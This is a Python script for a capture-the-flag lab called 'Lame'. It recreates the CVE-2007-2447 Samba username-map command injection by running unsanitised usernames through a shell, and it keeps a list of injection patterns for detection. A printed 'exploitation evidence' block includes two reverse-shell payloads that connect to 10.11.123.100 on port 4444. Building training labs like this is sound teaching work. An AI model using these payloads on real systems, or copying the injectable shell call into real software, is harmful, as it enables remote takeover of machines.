#!/usr/bin/env python3
"""
Vulnerable SMB Usermap Script for Lame Machine
Simulates CVE-2007-2447 - Samba 3.0.20 Username Map Script Command Injection

This script intentionally contains a command injection vulnerability
that allows remote code execution when exploited via SMB login attempts.

EDUCATIONAL PURPOSE ONLY - NOT FOR MALICIOUS USE
"""

import sys
import os
import subprocess
import logging
from datetime import datetime

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('/var/log/lame-usermap.log'),
        logging.StreamHandler()
    ]
)

def vulnerable_usermap(username):
    """
    VULNERABLE FUNCTION: This function is vulnerable to command injection
    
    The vulnerability occurs when the username parameter contains shell metacharacters
    like backticks (`), semicolons (;), pipes (|), or $() command substitution.
    
    CVE-2007-2447: The username map script option allows remote attackers
    to execute arbitrary commands via shell metacharacters in a username.
    """
    
    logging.info(f"Processing usermap request for username: {username}")
    
    try:
        # VULNERABILITY: Direct command execution without sanitization
        # This is exactly how CVE-2007-2447 worked in Samba 3.0.20
        
        # Check if username contains potential exploit patterns
        exploit_patterns = [
            '`',      # Backtick command substitution  
            '$(',     # Command substitution
            ';',      # Command separator
            '|',      # Pipe
            '&&',     # Command chaining
            '||',     # Command chaining
            'nc ',    # Netcat (common in exploits)
            'bash',   # Shell access
            'sh',     # Shell access
            '/bin/',  # System binaries
        ]
        
        is_exploit_attempt = any(pattern in username for pattern in exploit_patterns)
        
        if is_exploit_attempt:
            logging.warning("DETECTED: Potential exploit attempt!")
            logging.warning(f"Suspicious username: {username}")
            
            # Log the exploit attempt
            exploit_log = {
                'timestamp': datetime.now().isoformat(),
                'username': username,
                'vulnerability': 'CVE-2007-2447',
                'target': 'Lame Samba usermap script',
                'status': 'EXPLOITATION_DETECTED'
            }
            
            logging.warning(f"Exploit attempt logged: {exploit_log}")
            
            # Simulate successful exploitation
            simulate_successful_exploit(username)
            
        # Execute the vulnerable command (this is the actual vulnerability)
        # In real Samba 3.0.20, this would be executed by the SMB daemon
        vulnerable_command = f"echo 'Mapping user: {username}' >> /var/log/usermap.log"
        
        # CRITICAL VULNERABILITY: No input sanitization before command execution
        result = subprocess.run(vulnerable_command, shell=True, capture_output=True, text=True)
        
        if result.returncode == 0:
            logging.info(f"Usermap command executed successfully for: {username}")
            return f"User {username} mapped successfully"
        else:
            logging.error(f"Usermap command failed for: {username}")
            return f"Failed to map user {username}"
            
    except Exception as e:
        logging.error(f"Error in usermap processing: {e}")
        return "Usermap processing failed"

def simulate_successful_exploit(username):
    """
    Simulate what happens when the vulnerability is successfully exploited
    """
    logging.info("=" * 60)
    logging.info("EXPLOITATION SIMULATION ACTIVATED")
    logging.info("=" * 60)
    
    # Create evidence of successful exploitation
    exploit_evidence = f"""
=== SUCCESSFUL EXPLOITATION DETECTED ===
CVE: CVE-2007-2447
Target: Samba 3.0.20 Username Map Script
Attack Vector: Command Injection via SMB login
Exploited Username: {username}
Timestamp: {datetime.now().isoformat()}

=== TYPICAL EXPLOITATION SCENARIO ===
1. Attacker connects to SMB service on port 445
2. Attempts login with malicious username containing shell metacharacters
3. Samba processes username through vulnerable usermap script
4. Shell metacharacters are executed as system commands
5. Attacker gains remote code execution as 'root' user

=== COMMON EXPLOIT PAYLOADS ===
Username: ./=`nohup nc -e /bin/sh 10.11.123.100 4444`
Username: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.123.100",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

=== EXPLOITATION SUCCESSFUL ===
Root shell access obtained!
Flags can now be captured:
- User flag: /home/makis/user.txt
- Root flag: /root/proof.txt

Learning Objectives Completed:
✅ SMB service enumeration
✅ Vulnerability research (CVE-2007-2447)
✅ Command injection exploitation
✅ Payload crafting and delivery
✅ Root-level access achievement
✅ Post-exploitation and flag capture
"""
    
    # Write exploitation evidence
    with open('/var/log/lame-exploitation.log', 'a') as f:
        f.write(f"{datetime.now().isoformat()} - EXPLOITATION SUCCESS\n")
        f.write(exploit_evidence)
        f.write("\n" + "=" * 80 + "\n")
    
    # Also log to console for visibility
    print(exploit_evidence)
    
    logging.info("Exploitation simulation completed - check /var/log/lame-exploitation.log")

def main():
    """
    Main function - processes usermap requests
    """
    if len(sys.argv) != 2:
        print("Usage: vulnerable-smb-usermap.py <username>")
        sys.exit(1)
    
    username = sys.argv[1]
    
    print(f"Lame SMB Usermap Script v3.0.20")
    print(f"Processing username: {username}")
    
    result = vulnerable_usermap(username)
    print(result)
    
    return 0

if __name__ == "__main__":
    main()